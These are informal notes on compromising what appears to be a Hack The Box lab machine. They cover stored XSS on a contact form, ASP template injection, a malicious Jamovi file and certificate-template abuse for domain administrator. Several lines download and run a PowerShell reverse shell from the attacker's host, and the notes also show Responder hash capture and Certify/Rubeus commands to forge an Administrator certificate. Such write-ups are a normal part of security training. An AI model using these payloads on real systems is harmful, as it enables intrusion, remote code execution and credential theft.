i did a scan and got some ports open . on visiting 443 port we get error

rustscan said a ==subdomain== www.something on visiting it we get a working web page

the contact page seemed to be working so i ==intercepted== the request . It was first sending the request to save.asp

then redirect it to verify.asp  . Interstingly it was not using  aspx and the header ==dont had X-Powered-By: ASP.NET==

on running ==gobuster== with extension asp it told about text.asp. test.asp holds our all data that we send by contact form

we tried ==js injection== ,alert("XSS"), it worked on visiting test.asp.

now we tried to connect to our pc and we did a ==img injection==

`<img src="https://10.10.14.10/aa" />` and listen on nc -lvnp 443

> ### **==NOTE==**:- http will not work as page was on https so USE https

we get connection. now we did ==ssti== on the contact form to get a shell

```
${{<%[%'"}}%\.
these are all types of ssti. we will send them
to find out bad charecters. like  send 
${{<%[%'"}}% this the ${{<%[%'" this and stop when no error message come.

<%= 7*7 %> we got 49

<%= CreateObject("Wscript.Shell").exec("powershell IEX (New-Object Net.WebClient).downloadString('http://10.10.14.10/shell.ps1')").StdOut.ReadAll() %>
we did this to get a shell
```

`https://github.com/tennc/webshell/blob/master/asp/webshell.asp` ->> ref link

we were in a ==docker==

so we did a chisel on port 1080 and got a webpage by adding ==proxycahins== ..

it showed a webpage with internal ip .. i changed it to my ip and got hash on my ==reponder== and thus localadmins password

we got access to smb and on share we found a file ==omv==.

it means ==Jamovi== and on search we found a exploit that we can send paylaod from the column name and it will execute it

to give us shell

we will upload the same file via smb which had a recent timestamp with payload in it

```
there was a file Whatif.omv
we did unzip Whatif.omv an got a josn file metadata.json .. in it we can cahnge the name to 
 "name": "a<script src='http://10.10.14.10/sploit.js'></scrip>"
 it point to sploit.js

 which was
 
require('child_process').exec("powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10:81/shell.ps1') ")
 
 without <script> tag as the file was sploit.json
 and we got shell on  main pc
```

on running winpeas it suggested something about ==spn ticket== so we ran certify and rubeus to get shell

```
.\certify.exe find /vulnerable /currentuser
we got Web template 
.\c.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:Administrator
to get key 
save both keys in same file
then run command said by certify to change them in pfx
then
.\r.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```

get shell with ntlm password
